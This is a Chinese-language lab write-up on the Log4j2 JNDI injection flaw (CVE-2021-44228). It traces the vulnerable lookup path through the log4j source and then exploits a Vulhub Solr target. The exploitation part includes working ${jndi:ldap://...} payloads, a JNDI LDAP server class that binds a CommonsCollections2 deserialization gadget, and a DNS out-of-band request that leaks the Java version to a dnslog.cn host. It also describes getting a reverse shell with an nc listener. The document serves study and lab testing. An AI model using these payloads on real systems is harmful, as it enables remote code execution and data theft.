# 分析版本

JDK8u141

依赖

```xml
<dependencies>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-api</artifactId>
        <version>2.14.1</version>
    </dependency>
</dependencies>
```

# 分析流程

官方文档[Log4j – Log4j 2 Lookups (apache.org)](https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup)

直接上payload再去分析

```java
public class log4jTest {
    public static final Logger LOGGER = LogManager.getLogger(log4jTest.class);
    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://localhost:10389/cn=Exp,dc=example,dc=com}");
    }
}
```

log4j漏洞最后是调用了JNDI的lookup方法，之后的就是LDAP和RMI的流程了，所以我们分析lo4j把断点打在InitialContext#lookup处，看调用栈。

调用到MessagePatternConverter#format，对日志内容进行格式化，当日志内容包含`${`时，会调用到`workingBuilder.append(config.getStrSubstitutor().replace(event, value));`

<img src="https://s2.loli.net/2024/08/05/zUZwj7JF9AOdu56.png" alt="image-20240805214144872" style="zoom:200%;" />

之后调用StrSubstitutor#substitude，将{}之间内容提取出来

```java
String varValue = resolveVariable(event, varName, buf, startPos, endPos); //此处varName已经为jndi:ldap://localhost:10389/cn=Exp,dc=example,dc=com
```

跟进StrSubstitutor#resolveVariable

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                 final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    return resolver.lookup(event, variableName);  //跟进
}
```

Interpolator#lookup

```java
public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);   //查找:的索引
    if (prefixPos >= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US); //获取jndi
        final String name = var.substring(prefixPos + 1); //获取ldap://localhost:10389/cn=Exp,dc=example,dc=com
        final StrLookup lookup = strLookupMap.get(prefix);//下面解释
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);//跟进
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); 
    }
    return null;
}
```

![image-20240805220320242](https://s2.loli.net/2024/08/06/pXvms7I4o2haNzq.png)

很明显看到strLookupMap是个hashMap类，`ookup = strLookupMap.get(prefix);`调用key为jndi的value，得到JndiLookup跟进。

在`JndiManager.getDefaultManager()`中会get一个JndiManager对象，context属性是InitialContext

```java
//JndiLookup#lookup
public String lookup(final LogEvent event, final String key) {
    if (key == null) {
        return null;
    }
    final String jndiName = convertJndiName(key);
    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
        return Objects.toString(jndiManager.lookup(jndiName), null);//调用
    } catch (final NamingException e) {
        LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
        return null;
    }
}
```

跟进JndiManager#lookup

```java
public <T> T lookup(final String name) throws NamingException {
    return (T) this.context.lookup(name); //上面提到了context是InitialContext，所以调用Context.lookup()
}
```

之后就是JNDI的流程了

之后我切到JDK8u201版本，添加了CC依赖。进行JNDI的反序列化测试，一样的可以弹计算器，就是需要目标有可利用依赖。

```java
public class JNDILDAPServerBypass {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        //Reference refObj = new Reference("Test", "Test", "http://localhost:4444/");
        initialContext.rebind("ldap://localhost:10389/cn=Evil,dc=example,dc=com", getEvilPriorityQueue());

    }

    public static PriorityQueue getEvilPriorityQueue() throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());


        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);

        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        return priorityQueue;
    }

}
```

![image-20240806101730892](https://s2.loli.net/2024/08/06/ZDwdSGKeMsi4kyr.png)

# Vulhub靶场

进入`vulhub-master/log4j/CVE-2021-44228`拉取镜像

测试一些poc

## DNS带外

可以拿到一些系统信息

`${java:os}` `${sys:java.version}` java版本

`${env:JAVA_HOME}` 系统变量，等如果字符不符合DNS要求是获取不到的

举个例子获取靶机java版本`http://192.168.20.130:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.hvu8vg.dnslog.cn}`

![image-20240806143013392](https://s2.loli.net/2024/08/06/cYWjNF4feHzbPA8.png)

![image-20240806143027984](https://s2.loli.net/2024/08/06/ADs18kGcym6KwCW.png)

## 反弹shell

用Yakit，先生成LDAP反弹shell的反连地址，反连主机我填的是kali

![image-20240806155003990](https://s2.loli.net/2024/08/06/UZCD2gVqmk6LJdt.png)

![image-20240806155053023](https://s2.loli.net/2024/08/06/e8m9gUpfhRb4rMd.png)

kali nc开启8888端口监听，拿到靶机shell

![image-20240806155242722](https://s2.loli.net/2024/08/06/dQ1WokzJUfj9CaX.png)

当然拿到的是docker权限

![image-20240806155551345](https://s2.loli.net/2024/08/06/7q2Qw9V35GobOrI.png)

参考文章[Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/316143.html)